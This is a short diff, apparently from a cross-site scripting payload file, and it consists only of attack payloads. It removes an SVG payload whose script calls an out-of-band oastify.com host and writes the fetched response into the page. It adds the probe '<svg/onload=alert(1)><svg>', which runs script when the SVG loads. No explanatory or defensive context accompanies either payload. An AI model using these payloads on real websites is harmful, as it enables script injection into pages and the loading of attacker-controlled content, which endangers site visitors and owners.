@@ -1,10 +1,2 @@
-<svg xmlns="http://www.w3.org/1999/svg">
-<script>x=new XMLHttpRequest;
-x.onload=function(){
-document.write(this.responseText)
-};
-x.open("GET","https://4ejrcr545rdkw7jwt96grc1b228twjk8.oastify.com");
-x.send();
-</script>
-</svg>
+<svg/onload=alert(1)><svg>
 
